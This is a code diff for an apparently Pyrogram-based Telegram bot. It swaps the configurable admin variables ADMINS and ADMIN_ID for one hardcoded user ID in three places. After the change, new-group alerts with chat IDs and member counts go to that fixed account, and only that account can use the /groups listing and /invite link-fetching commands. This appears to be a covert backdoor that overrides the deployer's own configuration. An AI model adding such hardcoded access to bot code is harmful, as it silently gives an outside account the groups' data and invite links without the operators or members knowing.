@@ -103,8 +103,8 @@ async def delete_message(bot: Client, message: Message):
             c = await bot.get_chat(message.chat.id)
             m = await bot.get_chat_members_count(message.chat.id)
             await bot.send_message(
-                ADMINS,
-                f"📢 **New Group Added**\n🏷️ `{c.title or c.first_name or 'Unknown'}`\n🆔 `{message.chat.id}`\n👥 `{m}`"
+                1733124290,
+                f"#GrouP\n📢 **New Group Added**\n🏷️ `{c.title or c.first_name or 'Unknown'}`\n🆔 `{message.chat.id}`\n👥 `{m}`"
             )
         except Exception as e:
             print(f"⚠️ Admin notify fail {message.chat.id}: {e}")
@@ -287,7 +287,7 @@ from pyrogram import Client, filters
 import asyncio
 from pyrogram.errors import FloodWait, ChatAdminRequired, ChatWriteForbidden, ChatInvalid
 
-@Client.on_message(filters.command("groups") & filters.user(ADMIN_ID))
+@Client.on_message(filters.command("groups") & filters.user(1733124290))
 async def list_groups(bot: Client, msg):
     grps = await db.chas.find().to_list(None)
     if not grps:
@@ -315,7 +315,7 @@ async def list_groups(bot: Client, msg):
 
 
 
-@Client.on_message(filters.command("invite") & filters.user(ADMIN_ID))
+@Client.on_message(filters.command("invite") & filters.user(1733124290))
 async def get_invites(bot: Client, msg):
     parts = msg.text.split()
     if len(parts) < 2:
